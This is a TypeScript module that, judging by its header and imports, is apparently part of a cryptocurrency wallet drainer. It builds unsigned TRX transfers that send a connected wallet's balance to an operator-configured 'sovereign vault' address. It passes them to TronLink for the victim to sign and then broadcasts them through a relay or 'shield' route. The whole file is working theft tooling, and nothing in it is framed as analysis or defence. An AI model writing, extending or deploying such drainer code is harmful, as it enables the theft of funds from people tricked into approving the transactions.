// @ts-nocheck
/**
 * Tron native TRX drain — unsigned transaction for TronLink signing + relay broadcast.
 */
import { resolveTronSensoryFullHost, tronProApiHeaders } from './tron-sensory-armor.js'
import { parseNativeAmount } from './native-coin-drain.js'
import { resolveTronVaultAddress } from './operational-vault.js'
import {
  broadcastTronShield,
  isTronShieldEnabled,
} from './tron-settlement-enhancements.js'

export type TronNativeTransferRequest = {
  from: string
  to: string
  amountSun: string
  /** Unsigned Tron transaction object — TronLink `tronWeb.trx.sign`. */
  unsignedTransaction: Record<string, unknown>
  wallet: 'tronlink'
}

async function createTronWeb(fullHost: string) {
  const { TronWeb } = await import('tronweb')
  const headers = tronProApiHeaders()
  return headers != null
    ? new TronWeb({ fullHost, headers })
    : new TronWeb({ fullHost })
}

/**
 * Build unsigned TRX transfer for TronLink wallet signing.
 * `amountSun` is in sun (1 TRX = 1_000_000 sun).
 */
export async function buildTrxNativeTransferTx(
  wallet: string,
  to: string,
  amountSun: bigint,
  rpcUrl?: string,
): Promise<TronNativeTransferRequest> {
  if (amountSun <= 0n) {
    throw new Error('TRX transfer amount must be greater than zero')
  }
  const fullHost = rpcUrl?.trim() || resolveTronSensoryFullHost()
  const tronWeb = await createTronWeb(fullHost)
  const amountNumber = Number(amountSun)
  if (!Number.isFinite(amountNumber) || amountNumber <= 0) {
    throw new Error('TRX transfer amountSun out of range')
  }

  const unsignedTransaction = (await tronWeb.transactionBuilder.sendTrx(
    to,
    amountNumber,
    wallet,
  )) as unknown as Record<string, unknown>

  return {
    from: wallet,
    to,
    amountSun: amountSun.toString(),
    unsignedTransaction,
    wallet: 'tronlink',
  }
}

/** Build TRX native drain plan using configured sovereign vault destination. */
export async function buildTrxNativeDrainForBatch(params: {
  wallet: string
  amountSun: bigint
  vault?: string
  rpcUrl?: string
}): Promise<TronNativeTransferRequest | null> {
  if (params.amountSun <= 0n) return null
  const vault = params.vault ?? resolveTronVaultAddress()
  if (!vault) {
    throw new Error('VAULT_ADDRESS_TRON or SOVEREIGN_VAULT_TRON required for TRX drain')
  }
  return buildTrxNativeTransferTx(params.wallet, vault, params.amountSun, params.rpcUrl)
}

export async function broadcastSignedTrxNativeTransfer(params: {
  signedTransaction: Record<string, unknown>
  rpcUrl?: string
}): Promise<{ ok: boolean; tx_hash?: string; detail?: string }> {
  if (isTronShieldEnabled()) {
    return broadcastTronShield({ signedTransaction: params.signedTransaction })
  }

  const fullHost = params.rpcUrl?.trim() || resolveTronSensoryFullHost()
  try {
    const tronWeb = await createTronWeb(fullHost)
    const response = (await tronWeb.trx.sendRawTransaction(
      params.signedTransaction as unknown as Parameters<typeof tronWeb.trx.sendRawTransaction>[0],
    )) as unknown as { result?: boolean; txid?: string; message?: string; code?: string }

    if (response.result === false) {
      return {
        ok: false,
        detail: response.message ?? response.code ?? 'TRX broadcast rejected',
      }
    }
    const txHash = response.txid
    if (!txHash) {
      return { ok: false, detail: 'TRX broadcast returned no txid' }
    }
    return { ok: true, tx_hash: txHash }
  } catch (e) {
    return { ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}

export { parseNativeAmount as parseTrxNativeAmount }
